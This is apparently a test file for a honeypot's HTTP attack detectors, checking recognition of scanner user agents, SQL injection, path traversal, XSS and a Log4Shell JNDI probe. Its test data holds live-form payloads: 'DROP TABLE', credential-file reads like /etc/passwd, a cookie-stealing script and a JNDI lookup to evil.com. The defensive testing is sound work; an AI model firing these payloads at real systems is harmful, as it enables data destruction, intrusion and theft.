"""Tests for the HTTP detectors module."""

from __future__ import annotations

from honeystrike.services.http.detectors import (
    cve_signature,
    path_traversal_found,
    scanner_signature,
    sqli_pattern_found,
    xss_pattern_found,
)


def test_scanner_signature_detects_well_known_tools() -> None:
    for ua, expected in [
        ("sqlmap/1.7.8#stable (https://sqlmap.org)", "sqlmap"),
        ("Mozilla/5.0 (Nikto/2.5.0)", "Nikto"),
        ("Hydra v9.5", "Hydra"),
        ("WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)", "WPScan"),
        ("Mozilla/5.0 Masscan/1.0", "Masscan"),
        ("gobuster/3.6", "gobuster"),
    ]:
        result = scanner_signature({"User-Agent": ua})
        assert result is not None, f"missed {ua!r}"
        assert result.name == expected
        assert 0.0 < result.confidence <= 1.0


def test_scanner_signature_misses_real_browsers() -> None:
    chrome = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
    assert scanner_signature({"User-Agent": chrome}) is None


def test_scanner_signature_inspects_all_headers() -> None:
    # Some scanners leak their tool name in a custom header rather than UA.
    result = scanner_signature({"User-Agent": "Mozilla/5.0", "X-Tool": "sqlmap"})
    assert result is not None
    assert result.name == "sqlmap"


def test_sqli_pattern_recognises_common_payloads() -> None:
    for sample in [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "UNION ALL SELECT username, password FROM users",
        "1 OR 1=1",
        "1; SLEEP(5)",
        "1' AND BENCHMARK(1000000, MD5(1)) AND '1'='1",
        "0;WAITFOR DELAY '0:0:10'--",
    ]:
        assert sqli_pattern_found(sample), f"missed: {sample!r}"


def test_sqli_pattern_does_not_flag_clean_input() -> None:
    assert not sqli_pattern_found("admin")
    assert not sqli_pattern_found("hello world")
    assert not sqli_pattern_found("")
    assert not sqli_pattern_found(None)


def test_path_traversal_pattern() -> None:
    for sample in [
        "/etc/passwd",
        "/var/www/html/../../etc/passwd",
        "/wp-content/..%2f..%2fetc/passwd",
        "/files?path=..\\..\\windows\\win.ini",
        "/proc/self/environ",
    ]:
        assert path_traversal_found(sample), f"missed: {sample!r}"

    assert not path_traversal_found("/wp-admin/index.php")
    assert not path_traversal_found(None)


def test_xss_pattern_recognises_payloads() -> None:
    for sample in [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<iframe src=evil.com></iframe>",
    ]:
        assert xss_pattern_found(sample), f"missed: {sample!r}"


def test_cve_signature_matches_known_probes() -> None:
    assert cve_signature("/.env") == "CONFIG_FILE_PROBE"
    assert cve_signature("/.git/config") == "GIT_REPO_LEAK"
    assert cve_signature("/manager/html") == "TOMCAT_MANAGER_PROBE"
    assert cve_signature("/actuator/env") == "SPRING_ACTUATOR"
    # Log4Shell payload comes in the body, not the URI.
    assert (
        cve_signature("/anything", body="${jndi:ldap://evil.com/a}")
        == "CVE-2021-44228"
    )
    assert cve_signature("/wp-content/uploads/foo.jpg") is None
    assert cve_signature(None) is None
